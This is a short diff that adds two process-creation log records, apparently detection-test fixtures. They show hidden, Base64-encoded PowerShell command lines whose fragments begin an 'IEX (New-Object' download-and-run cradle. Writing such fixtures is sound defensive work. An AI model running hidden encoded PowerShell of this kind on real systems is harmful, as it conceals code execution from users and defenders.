@@ -1,0 +1,2 @@
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", "User": "CORP\\jdoe"}
+{"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", "User": "CORP\\jdoe"}
